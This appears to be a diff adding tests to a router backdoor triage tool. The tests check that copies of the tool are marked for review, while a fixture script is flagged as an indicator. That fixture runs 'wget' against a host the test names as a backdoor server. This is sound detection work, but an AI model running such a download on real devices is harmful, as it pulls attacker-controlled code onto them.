@@ -571,6 +571,18 @@ run "$D" "$OWL" --check >"$D/check.txt"
 expect "WireGuard server config written seconds after the loader is noted" 'grep -A1 "REVIEW  *backdoor-wg  */etc/config/wireguard_server" "$D/check.txt" | grep -q "written 11 s after"'
 umount "$D/m"
 
+echo "=== a copy of this script on the device is not a trace"
+D=$(mkscen selfcopy "$OWL")
+mnt "$D" "$OWL"
+for d in etc/config etc/init.d etc/hotplug.d/iface etc/profile.d root; do mkdir -p "$D/m/$d"; cp "$T" "$D/m/$d/gl-helper-triage.sh"; done
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
+expect "copies in /etc/config and in autostart places: REVIEW script-copy, exit 0, clean verdict" '[ $rc = 0 ] && grep -q "REVIEW  *script-copy  */etc/config/gl-helper-triage.sh" "$D/check.txt" && grep -q "REVIEW  *script-copy  */etc/init.d/gl-helper-triage.sh" "$D/check.txt" && ! grep -qE "^ +IOC " "$D/check.txt" && grep -q "Verdict: no gl-helper indicators found" "$D/check.txt"'
+printf '#!/bin/sh\nwget http://cdn.adguardns.com/x\n' >"$D/m/etc/config/other.sh"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+expect "another file that names a server of the backdoor is still IOC" '[ $rc = 1 ] && grep -q "IOC  *backdoor-host  */etc/config/other.sh" "$D/check.txt"'
+umount "$D/m"
+
 echo "=== what the base image's busybox loads must be the base image's (issue 8)"
 OWB=$BASE/openwrt-rom-libs
 cp -a "$OWL" "$OWB"; mkdir -p "$OWB/lib"
